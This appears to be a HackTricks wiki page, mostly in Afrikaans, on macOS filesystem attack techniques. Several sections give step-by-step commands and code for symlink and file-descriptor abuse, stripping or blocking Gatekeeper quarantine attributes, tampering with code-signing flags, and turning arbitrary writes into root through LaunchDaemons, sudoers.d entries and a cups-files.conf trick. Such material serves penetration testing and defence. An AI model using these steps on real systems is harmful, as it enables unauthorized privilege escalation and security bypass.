# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Permissions in a **directory**:

- **read** - jy kan die directory-inskrywings **enumerate**
- **write** - jy kan **files** in die directory **delete/write**, en jy kan **leë folders delete**.
- Maar jy **kan nie nie-leë folders delete/modify** tensy jy write-permissions daaroor het nie.
- Jy **kan nie die naam van ’n folder modify** tensy jy dit besit nie.
- **execute** - jy word **toegelaat om deur die directory te traverse** - as jy nie hierdie reg het nie, kan jy nie toegang tot enige files daarin of in enige subdirectories kry nie.

### Dangerous Combinations

**How to overwrite a file/folder owned by root**, but:

- Een ouer-**directory owner** in die path is die user
- Een ouer-**directory owner** in die path is ’n **users group** met **write access**
- ’n Users **group** het **write**-toegang tot die **file**

Met enige van die vorige kombinasies kan ’n aanvaller ’n **sym/hard link** in die verwagte path **inject** om ’n bevoorregte arbitrêre write te verkry.

### Folder root R+X Special case

As daar files in ’n **directory** is waar **slegs root R+X access** het, is daardie files **nie vir enigiemand anders accessible nie**. Dus kan ’n kwesbaarheid wat dit moontlik maak om ’n file wat deur ’n user gelees kan word, maar weens daardie **restriction** nie gelees kan word nie, vanuit hierdie folder **na ’n ander een te move**, misbruik word om hierdie files te lees.

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

As ’n bevoorregte proses data skryf in ’n **file** wat deur ’n **lower privileged user** **controlled** kan word, of wat voorheen deur ’n lower privileged user **created** kon word. Die user kan dit eenvoudig via ’n Symbolic of Hard link na ’n ander file **point**, waarna die bevoorregte proses op daardie file sal skryf.

Check die ander afdelings waar ’n aanvaller ’n **arbitrary write** kan **abuse to escalate privileges**.

### Open `O_NOFOLLOW`

Per [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"As `O_NOFOLLOW` in die mask gebruik word en die target file wat aan `open()` gegee word ’n symbolic link is, sal `open()` faal."* Slegs die **finale** komponent word nagegaan — elke **intermediate** komponent word steeds resolved en followed. Dus kan ’n developer wat ’n write met `O_NOFOLLOW` "protected" het, steeds aangeval word deur ’n symlink in enige **parent directory** van die target path te plant.

Dieselfde man page dokumenteer die flags wat daardie gap werklik sluit:

- **`O_NOFOLLOW_ANY`** — *"as ... enige komponent van die path wat aan `open()` gegee word ’n symbolic link is, sal `open()` faal."*
- **`O_RESOLVE_BENEATH`** — *"as ... die gespesifiseerde path resolution ontsnap uit die directory wat met die fd geassosieer word, sal `openat()` faal."*

Andersins is `openat()` relatief tot ’n directory FD wat jy reeds gevalideer het, of `realpath()` + re-validation, die oorblywende maniere om mid-path symlink swaps te stop.

## .fileloc

Files met die **`.fileloc`** extension kan na ander applications of binaries point, sodat die application/binary uitgevoer sal word wanneer hulle oopgemaak word.\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Lêerdeskripteurs

### Leak FD (no `O_CLOEXEC`)

As 'n oproep na `open` nie die vlag `O_CLOEXEC` het nie, sal die lêerdeskriptor deur die child process geërf word. Dus, as 'n privileged process 'n privileged file oopmaak en 'n process uitvoer wat deur die aanvaller beheer word, sal die aanvaller **die FD na die privileged file erf**.

Die canonical example is die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` het `DYLD_PRINT_TO_FILE=/path` selfs in **restricted (suid root) binaries** geëerbiedig, omdat daardie spesifieke veranderlike buite `processDyldEnvironmentVariable()` geparse is.
- Dit het `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` uitgevoer, en dus **'n root-owned file by 'n arbitrêre pad geskep**.
- Die FD is **nooit gesluit nie en het geen close-on-exec-vlag gehad nie**, dus het elke child van die suid binary 'n **skryfbare FD na 'n root-owned file geërf**.
- Deur byvoorbeeld `DYLD_PRINT_TO_FILE=/etc/target suid_binary` uit te voer en dan die geërfde FD-nommer in die child te lees, kon arbitrêre skrywings na root-owned files gedoen word; `fcntl(fd, F_SETFL, 0)` het selfs `O_APPEND` verwyder om oorskrywing in plaas van byvoeging toe te laat.

Dieselfde patroon kom voor wanneer 'n privileged process 'n file oopmaak **voordat** dit iets uitvoer wat jy beheer (`exec`) (helper tools, `crontab`-style editors wat deur `$EDITOR` aangeroep word, log/debug files wat vanaf 'n env-var-pad oopgemaak word...). Enumerate die FDs wat jy geërf het met:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Enigiets bo `2` wat na 'n lêer wys wat jy nie self kan oopmaak nie, is 'n arbitrary-write (of arbitrary-read) primitive.

## Vermy quarantine xattrs tricks

### Verwyder dit
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

As 'n lêer/gids hierdie immutable-attribuut het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Lêerstelsels sonder xattr-ondersteuning

Nie elke lêerstelsel wat macOS kan mount, stoor **uitgebreide attribute** natively nie. HFS+ en APFS doen dit; **FAT32, exFAT en (die meeste) NFS-mounts doen dit nie** — macOS emuleer dit deur ’n **AppleDouble**-sy-lêer met die naam `._<filename>` te skryf ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Dit is belangrik vir quarantine, omdat die xattr slegs behoue bly indien dit werklik vanaf dieselfde volume geskryf **en teruggelees** kan word:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
As die volume later gelees word via 'n pad wat die `._`-begeleidende lêer ignoreer (of die begeleidende lêer verwyder word), arriveer die lêer **sonder 'n quarantine-vlag** — en 'n ongequarantined `.app` is genoeg om uit die App Sandbox te ontsnap, soos bespreek in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Hierdie ACL voorkom dat `xattrs` by die lêer gevoeg word.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format kopieer 'n lêer insluitend sy ACEs.

In die [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL-teksrepresentasie wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedekomprimeerde lêer gestel gaan word. Dus, as jy 'n application in 'n zip-lêer met **AppleDouble** file format saamgepers het met 'n ACL wat verhoed dat ander xattrs daarin geskryf word... is die quarantine xattr nie op die application gestel nie:

Kyk na die [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Om dit te repliseer, moet ons eers die korrekte acl-string kry:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Let daarop dat selfs al werk dit, die sandbox die quarantine xattr vooraf skryf)

Nie regtig nodig nie, maar ek laat dit daar net vir ingeval:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass van signature checks

### Bypass van platform binaries checks

Sommige security checks kontroleer of die binary 'n **platform binary** is, byvoorbeeld om toe te laat dat dit aan 'n XPC service koppel. Soos egter uiteengesit in die bypass by https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, is dit moontlik om hierdie check te bypass deur 'n platform binary (soos /bin/ls) te verkry en die exploit via dyld te inject deur 'n omgewingsveranderlike `DYLD_INSERT_LIBRARIES` te gebruik.

### Bypass van flags `CS_REQUIRE_LV` en `CS_FORCED_LV`

Dit is moontlik vir 'n uitvoerende binary om sy eie flags te wysig om checks te bypass met kode soos:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles bevat die lêer **`_CodeSignature/CodeResources`** wat die **hash** van elke enkele **file** in die **bundle** bevat. Let daarop dat die hash van CodeResources ook **ingebed is in die executable**, dus kan ons ook nie daarmee peuter nie.

Daar is egter sommige lêers waarvan die signature nie nagegaan sal word nie; hulle het die sleutel `omit` in die plist, byvoorbeeld:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Dit is moontlik om die handtekening van 'n resource vanaf die cli te bereken met:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

'n Gebruiker kan 'n pasgemaakte dmg wat geskep is selfs bo-op sommige bestaande vouers mount. Dit is hoe jy 'n pasgemaakte dmg-pakket met pasgemaakte inhoud kan skep:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Gewoonlik mount macOS skywe deur met die `com.apple.DiskArbitrarion.diskarbitrariond` Mach-diens te kommunikeer (verskaf deur `/usr/libexec/diskarbitrationd`). As die parameter `-d` by die LaunchDaemons plist-lêer gevoeg en dit herbegin word, sal logs in `/var/log/diskarbitrationd.log` gestoor word.\
Dit is egter moontlik om tools soos `hdik` en `hdiutil` te gebruik om direk met die `com.apple.driver.DiskImages` kext te kommunikeer.

## Arbitrêre skryfbewerkings

### Periodic sh-skripte

As jou script as ’n **shell script** geïnterpreteer kan word, kan jy die **`/etc/periodic/daily/999.local`** shell script oorskryf wat elke dag geaktiveer sal word.

Jy kan ’n **fake** uitvoering van hierdie script uitvoer met: **`sudo periodic daily`**

### Daemons

Skryf ’n arbitrêre **LaunchDaemon** soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** met ’n plist wat ’n arbitrêre script uitvoer soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genereer slegs die script `/Applications/Scripts/privesc.sh` met die **commands** wat jy as root wil uitvoer.

### Sudoers File

As jy **arbitrary write** het, kan jy 'n lêer binne die vouer **`/etc/sudoers.d/`** skep wat aan jouself **sudo**-voorregte gee.

### PATH files

Die lêer **`/etc/paths`** is een van die belangrikste plekke wat die PATH-omgewingsveranderlike vul. Jy moet root wees om dit te oorskryf, maar as 'n script vanaf 'n **privileged process** 'n **command without the full path** uitvoer, kan jy dit moontlik **hijack** deur hierdie lêer te wysig.

Jy kan ook lêers in **`/etc/paths.d`** skryf om nuwe vouers in die `PATH`-omgewingsveranderlike te laai.

### cups-files.conf

Hierdie tegniek is in [hierdie writeup](https://www.kandji.io/blog/macos-audit-story-part1) gebruik.

Skep die lêer `/etc/cups/cups-files.conf` met die volgende inhoud:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
This sal die lêer `/etc/sudoers.d/lpe` met permissies 777 skep. Die ekstra gemors aan die einde is om die skepping van die error log te aktiveer.

Skryf dan die nodige config na `/etc/sudoers.d/lpe` om privileges te eskaleer, soos `%staff ALL=(ALL) NOPASSWD:ALL`.

Wysig daarna die lêer `/etc/cups/cups-files.conf` weer en dui `LogFilePerm 700` aan, sodat die nuwe sudoers-lêer geldig word wanneer `cupsctl` aangeroep word.

### Sandbox Escape

Dit is moontlik om die macOS sandbox met 'n FS arbitrary write te ontsnap. Vir enkele voorbeelde, kyk na die bladsy [macOS Auto Start](../../../../macos-auto-start-locations.md), maar 'n algemene voorbeeld is om 'n Terminal preferences-lêer in `~/Library/Preferences/com.apple.Terminal.plist` te skryf wat 'n command by startup uitvoer, en dit met `open` aan te roep.

## Skep writable files as ander users

'n Baie algemene privesc primitive is om 'n **privileged process 'n file vir jou te laat skep** in 'n directory wat jy beheer, en dan **write access** tot daardie file te behou. Twee bestanddele word benodig:

1. 'n Directory wat jy besit (of waar jy 'n **inheritable ACL** kan stel), sodat enigiets wat binne geskep word jou permissions oorneem.
2. 'n Privileged/`suid` process wat aangesê kan word **waar** om 'n file te skep — gewoonlik deur 'n debug/logging environment variable, 'n config file, of 'n helper se XPC API.

Die **inheritable ACL**-gedeelte is wat die geskepte file writable vir jou maak, selfs al word dit deur 'n ander user besit. Die `file_inherit` / `directory_inherit` inheritance flags word in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) gedokumenteer:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Nou is enige lêer wat ’n bevoorregte proses binne `$DIRNAME` skep **deur jou skryfbaar**. As daardie gids ook ’n ligging is wat later **as root uitgevoer** word (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ’n LaunchDaemon-gids...), is dit ’n direkte root escalation. Sien die afdelings [Sudoers File](#sudoers-file) en [cups-files.conf](#cups-filesconf) hierbo vir wat om te skryf sodra jy die lêer het.

Vir ’n volledige uitgewerkte voorbeeld van die `"env variable makes a root process create a file, and the FD leaks to you"`-ketting, sien [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hierbo.

## POSIX Gedeelde Geheue

**POSIX shared memory** laat prosesse in POSIX-voldoende bedryfstelsels toe om toegang tot ’n gemeenskaplike geheue-area te verkry, wat vinniger kommunikasie moontlik maak in vergelyking met ander inter-proses-kommunikasiemetodes. Dit behels die skep of oopmaak van ’n shared memory-objek met `shm_open()`, die instelling van die grootte daarvan met `ftruncate()`, en die kartering daarvan in die proses se adresruimte met behulp van `mmap()`. Prosesse kan dan direk uit hierdie geheue-area lees en daarheen skryf. Om gelyktydige toegang te bestuur en datakorrupsie te voorkom, word sinkronisasiemeganismes soos mutexes of semaphores dikwels gebruik. Laastens ontkoppel en sluit prosesse die shared memory met `munmap()` en `close()`, en verwyder hulle opsioneel die geheue-objek met `shm_unlink()`. Hierdie stelsel is veral doeltreffend vir vinnige, effektiewe IPC in omgewings waar verskeie prosesse vinnig toegang tot gedeelde data moet verkry.

<details>

<summary>Kodevoorbeeld van produsent</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Verbruikerskode-voorbeeld</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** is 'n sekuriteitsfunksie wat in macOS bekendgestel is om die veiligheid en betroubaarheid van **file descriptor operations** in gebruikerstoepassings te verbeter. Hierdie guarded descriptors bied 'n manier om spesifieke beperkings of "guards" met file descriptors te assosieer, wat deur die kernel afgedwing word.

Hierdie funksie is veral nuttig om sekere klasse sekuriteitskwesbaarhede, soos **unauthorized file access** of **race conditions**, te voorkom. Hierdie kwesbaarhede ontstaan byvoorbeeld wanneer een thread toegang tot 'n file description verkry en **aan 'n ander kwesbare thread toegang daartoe gee**, of wanneer 'n file descriptor deur 'n kwesbare child process **geërf** word. Sommige funksies wat met hierdie funksionaliteit verband hou, is:

- `guarded_open_np`: Open 'n FD met 'n guard
- `guarded_close_np`: Sluit dit
- `change_fdguard_np`: Verander guard flags op 'n descriptor (selfs om die guard-beskerming te verwyder)

## Verwysings

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
